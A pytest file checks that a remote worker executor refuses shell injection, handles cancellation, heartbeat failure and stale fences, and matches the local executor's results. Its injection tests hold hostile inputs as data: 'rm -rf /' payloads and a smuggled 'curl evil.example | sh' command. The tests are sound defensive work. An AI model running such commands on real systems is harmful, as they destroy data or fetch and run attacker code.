"""RMDD-15: ``RemoteWorkerExecutor`` -- injection, cancellation, fence, and
local/remote parity proofs.

These tests require the optional ``tunnel-manager`` dependency (RMDD-14's
``tunnel_manager.remote_execution`` seam) because they exercise the real
frozen wire models (``RemoteCommandRequest``/``RemoteExecutionResult``), not
a hand-rolled stand-in -- the whole point is proving this package's
composition against TM's *actual* validators.  As of this lane's work
(2026-08-10) that module lives only on tunnel-manager's own unmerged
integration branch and predates every published PyPI release (see
``repository_manager/remote_execution/README.md``), so it is not resolvable
as a normal dependency yet.  This is a documented, disclosed skip -- an
honest absence, not a masked failure (H-12) -- and is reported in the lane
handoff with the exact command used to make it available for this run.
"""

from __future__ import annotations

import threading
import time

import pytest

tunnel_manager = pytest.importorskip(
    "tunnel_manager.remote_execution",
    reason=(
        "optional dependency: RMDD-14's tunnel_manager.remote_execution seam "
        "is not installed in this environment (see remote_execution/README.md)"
    ),
)

from tunnel_manager.remote_execution import (  # noqa: E402
    AuthorizedTarget,
    RemoteCommandRequest,
)

from repository_manager.development import (  # noqa: E402
    ExecutionCommand,
    ExecutionOutcome,
    ExecutionResult,
    FailureClass,
)
from repository_manager.execution.cancellation import CancellationToken  # noqa: E402
from repository_manager.execution.executor import (  # noqa: E402
    LocalExecutor,
    PublicationDecision,
)
from repository_manager.remote_execution.executor import (  # noqa: E402
    RemoteWorkerExecutor,
    cancellation_marker_path,
    to_remote_request,
)
from repository_manager.remote_execution.fakes import (  # noqa: E402
    FakeRemoteExecutorPort,
)

_TARGET = AuthorizedTarget(alias="build-1")


def _command(
    *argv: str, workdir: str = "/srv/remote-worktrees/demo"
) -> ExecutionCommand:
    return ExecutionCommand(argv=argv, workdir=workdir, timeout_seconds=30)


# ---------------------------------------------------------------------------
# Injection-attempt proofs
# ---------------------------------------------------------------------------


def test_shell_c_invocation_is_refused_by_the_frozen_tm_wire_model() -> None:
    """``sh -c "..."`` / ``bash -c "..."`` are refused, not rendered.

    This is the frozen RMDD-14 contract's own defense (``normalize_argv``);
    RMDD-15 must not weaken or bypass it in translation.
    """

    with pytest.raises(Exception) as excinfo:  # pydantic ValidationError
        RemoteCommandRequest(
            argv=("bash", "-c", "rm -rf / #"),
            workdir="/srv/remote-worktrees/demo",
        )
    assert "shell" in str(excinfo.value).lower()


def test_to_remote_request_translates_a_malicious_looking_argv_as_one_opaque_token() -> (
    None
):
    """Metacharacters inside a *value* survive translation as inert data.

    ``ExecutionCommand``/``RemoteCommandRequest`` are fixed-argv models; a
    value containing ``;``/``$()``/backticks is never concatenated into a
    shell string by this package, so it can never break out of its own argv
    element.  Proven by round-tripping and confirming the element count and
    exact string are unchanged.
    """

    malicious = "innocuous-arg; rm -rf / #"
    command = _command("echo", malicious)
    request = to_remote_request(command)
    assert request.argv == ("echo", malicious)
    assert len(request.argv) == 2


def test_injection_attempt_is_refused_end_to_end_through_the_executor() -> None:
    """A caller cannot smuggle a second command past ``RemoteWorkerExecutor``.

    The dispatched request's argv is captured by the fake port; this proves
    the value that would reach ``TunnelCommandExecutor.execute`` (and from
    there ``shlex.join``-rendered onto one SSH command line) is the exact
    fixed tuple the caller supplied -- never a broader shell string.
    """

    port = FakeRemoteExecutorPort()
    executor = RemoteWorkerExecutor(_TARGET, actor=None, port=port)
    command = _command("git", "log", "--oneline; curl evil.example | sh")

    result = executor.run(command, command_id="command:1", fence="fence:1")

    assert result.outcome == ExecutionOutcome.SUCCEEDED
    assert len(port.calls) == 1
    dispatched_target, dispatched_request, _ = port.calls[0]
    assert dispatched_target.alias == "build-1"
    assert dispatched_request.argv == (
        "git",
        "log",
        "--oneline; curl evil.example | sh",
    )
    assert len(dispatched_request.argv) == 3  # never split into a 4th argv element


def test_shell_names_with_dash_c_are_refused_even_via_the_full_executor_path() -> None:
    port = FakeRemoteExecutorPort()
    executor = RemoteWorkerExecutor(_TARGET, actor=None, port=port)
    command = _command("sh", "-c", "id")

    result = executor.run(command, command_id="command:2", fence="fence:2")

    assert result.outcome == ExecutionOutcome.REFUSED
    assert result.failure_class == FailureClass.INVALID_REQUEST
    assert port.calls == []  # never dispatched


# ---------------------------------------------------------------------------
# Cancellation proofs
# ---------------------------------------------------------------------------


def test_cancellation_before_dispatch_never_calls_the_port() -> None:
    port = FakeRemoteExecutorPort()
    executor = RemoteWorkerExecutor(_TARGET, actor=None, port=port)
    token = CancellationToken()
    token.cancel("test cancel")

    result = executor.run(
        _command("git", "status"),
        command_id="command:3",
        fence="fence:3",
        cancellation=token,
    )

    assert result.outcome == ExecutionOutcome.CANCELLED
    assert port.calls == []


def test_cancellation_mid_dispatch_sends_the_fixed_marker_and_downgrades_success() -> (
    None
):
    """The cooperative cancellation proof.

    A cancellation token that fires *while* the primary dispatch is still
    "in flight" (simulated with a small sleep in the responder) must cause a
    second, fixed ``touch <marker>`` command to the same target, and any
    success the primary dispatch still reports afterward must be downgraded
    to ``cancelled`` rather than ever published as a race-won success.
    """

    dispatched_commands: list[tuple[str, ...]] = []
    token = CancellationToken()

    def _responder(target, request, context):
        dispatched_commands.append(request.argv)
        if request.argv[0] == "touch":
            return FakeRemoteExecutorPort.succeeded(context)
        # Simulate an in-flight primary command: give the poll loop time to
        # observe the cancellation and send the marker before "finishing".
        time.sleep(0.3)
        return FakeRemoteExecutorPort.succeeded(context)

    port = FakeRemoteExecutorPort(responder=_responder)
    executor = RemoteWorkerExecutor(
        _TARGET, actor=None, port=port, poll_interval_seconds=0.05
    )

    def _cancel_shortly() -> None:
        time.sleep(0.05)
        token.cancel("operator requested cancellation")

    threading.Thread(target=_cancel_shortly, daemon=True).start()

    result = executor.run(
        _command("./run-tests.sh", workdir="/srv/remote-worktrees/demo"),
        command_id="command:4",
        fence="fence:4",
        cancellation=token,
    )

    assert result.outcome == ExecutionOutcome.CANCELLED
    assert result.failure_class == FailureClass.CANCELLED_DEADLINE
    marker_commands = [argv for argv in dispatched_commands if argv[0] == "touch"]
    assert len(marker_commands) == 1
    assert marker_commands[0][1] == cancellation_marker_path(
        "/srv/remote-worktrees/demo", "fence:4"
    )


def test_heartbeat_failure_mid_dispatch_sends_marker_and_refuses_not_cancels() -> None:
    """A heartbeat failure is a worker-environment refusal, not a cancellation.

    Mirrors ``LocalExecutor``'s own distinction (``REFUSED`` /
    ``WORKER_ENVIRONMENT_FAILURE`` for a failed heartbeat, versus
    ``CANCELLED`` / ``CANCELLED_DEADLINE`` for an actual cancellation token):
    a first cut of ``RemoteWorkerExecutor`` collapsed every poll-loop trigger
    into ``CANCELLED`` and this test caught that -- fixed in ``executor.py``
    to latch which specific check failed first.
    """

    def _slow_responder(target, request, context):
        if request.argv[0] == "touch":
            return FakeRemoteExecutorPort.succeeded(context)
        time.sleep(0.3)
        return FakeRemoteExecutorPort.succeeded(context)

    port = FakeRemoteExecutorPort(responder=_slow_responder)
    executor = RemoteWorkerExecutor(
        _TARGET, actor=None, port=port, poll_interval_seconds=0.05
    )

    result = executor.run(
        _command("./run-tests.sh"),
        command_id="command:5",
        fence="fence:5",
        heartbeat=lambda: False,  # fails immediately
    )

    assert result.outcome == ExecutionOutcome.REFUSED
    assert result.failure_class == FailureClass.WORKER_ENVIRONMENT_FAILURE


# ---------------------------------------------------------------------------
# Fence-loss / stale-attempt proofs (restart recovery)
# ---------------------------------------------------------------------------


def test_fence_invalid_before_dispatch_refuses_without_calling_the_port() -> None:
    port = FakeRemoteExecutorPort()
    executor = RemoteWorkerExecutor(_TARGET, actor=None, port=port)

    result = executor.run(
        _command("git", "status"),
        command_id="command:6",
        fence="fence:6",
        fence_check=lambda: False,
    )

    assert result.outcome == ExecutionOutcome.REFUSED
    assert result.failure_class == FailureClass.STALE_FENCE_DUPLICATE_EFFECT
    assert port.calls == []


def test_fence_lost_during_dispatch_downgrades_success_to_refused() -> None:
    fence_valid = {"value": True}

    def _lose_fence_shortly() -> None:
        time.sleep(0.02)
        fence_valid["value"] = False

    threading.Thread(target=_lose_fence_shortly, daemon=True).start()

    def _slow_responder(target, request, context):
        time.sleep(0.2)
        return FakeRemoteExecutorPort.succeeded(context)

    port = FakeRemoteExecutorPort(responder=_slow_responder)
    executor = RemoteWorkerExecutor(
        _TARGET, actor=None, port=port, poll_interval_seconds=0.05
    )

    result = executor.run(
        _command("git", "status"),
        command_id="command:7",
        fence="fence:7",
        fence_check=lambda: fence_valid["value"],
    )

    assert result.outcome == ExecutionOutcome.REFUSED
    assert result.failure_class == FailureClass.STALE_FENCE_DUPLICATE_EFFECT


def test_stale_attempt_cannot_publish_after_a_second_attempt_already_did() -> None:
    """Restart recovery: a duplicate/late attempt is refused, never published twice.

    Simulates a host-loss retry: attempt 1's dispatch eventually "returns"
    success (as if the original host had actually completed the work after
    all, arriving late), but the owning scheduler's ``PublicationPort`` has
    already accepted attempt 2's result and moved the fence -- so attempt 1's
    publish must be rejected (``FENCED``) and downgraded to ``refused``, never
    silently reported as a second success.
    """

    class _AlreadyMovedPublisher:
        def publish(
            self, result: ExecutionResult, *, fence: str
        ) -> PublicationDecision:
            assert fence == "fence:attempt-1"
            return PublicationDecision.FENCED  # the WorkItem already advanced

    port = FakeRemoteExecutorPort()
    executor = RemoteWorkerExecutor(_TARGET, actor=None, port=port)

    result = executor.run(
        _command("./run-tests.sh"),
        command_id="command:8",
        fence="fence:attempt-1",
        publisher=_AlreadyMovedPublisher(),
    )

    assert result.outcome == ExecutionOutcome.REFUSED
    assert result.failure_class == FailureClass.STALE_FENCE_DUPLICATE_EFFECT


def test_publisher_accepting_the_result_leaves_success_untouched() -> None:
    published: list[ExecutionResult] = []

    class _AcceptingPublisher:
        def publish(
            self, result: ExecutionResult, *, fence: str
        ) -> PublicationDecision:
            published.append(result)
            return PublicationDecision.ACCEPTED

    port = FakeRemoteExecutorPort()
    executor = RemoteWorkerExecutor(_TARGET, actor=None, port=port)

    result = executor.run(
        _command("./run-tests.sh"),
        command_id="command:9",
        fence="fence:9",
        publisher=_AcceptingPublisher(),
    )

    assert result.outcome == ExecutionOutcome.SUCCEEDED
    assert len(published) == 1


# ---------------------------------------------------------------------------
# Local/remote parity proof (acceptance gate: identical domain result)
# ---------------------------------------------------------------------------


def test_local_and_remote_executors_produce_the_same_result_shape_for_success(
    tmp_path,
) -> None:
    local = LocalExecutor(authorized_roots=tmp_path)
    local_result = local.run(
        ExecutionCommand(
            argv=("python3", "-c", "print('ok')"),
            workdir=str(tmp_path),
            timeout_seconds=10,
        ),
        command_id="command:local",
        fence="fence:local",
    )

    port = FakeRemoteExecutorPort()
    remote = RemoteWorkerExecutor(_TARGET, actor=None, port=port)
    remote_result = remote.run(
        _command("python3", "-c", "print('ok')"),
        command_id="command:remote",
        fence="fence:remote",
    )

    assert type(local_result) is type(remote_result) is ExecutionResult
    assert local_result.outcome == remote_result.outcome == ExecutionOutcome.SUCCEEDED
    assert local_result.exit_code == remote_result.exit_code == 0
    assert local_result.failure_class == remote_result.failure_class is None


def test_local_and_remote_executors_produce_the_same_result_shape_for_failure(
    tmp_path,
) -> None:
    local = LocalExecutor(authorized_roots=tmp_path)
    local_result = local.run(
        ExecutionCommand(
            argv=("python3", "-c", "import sys; sys.exit(3)"),
            workdir=str(tmp_path),
            timeout_seconds=10,
        ),
        command_id="command:local-fail",
        fence="fence:local-fail",
    )

    def _failing_responder(target, request, context):
        return FakeRemoteExecutorPort.failed(
            context, failure_class=FailureClass.VALIDATION_CANDIDATE_FAILURE
        )

    port = FakeRemoteExecutorPort(responder=_failing_responder)
    remote = RemoteWorkerExecutor(_TARGET, actor=None, port=port)
    remote_result = remote.run(
        _command("python3", "-c", "import sys; sys.exit(3)"),
        command_id="command:remote-fail",
        fence="fence:remote-fail",
    )

    assert local_result.outcome == remote_result.outcome == ExecutionOutcome.FAILED
    assert local_result.failure_class is not None
    assert remote_result.failure_class is not None
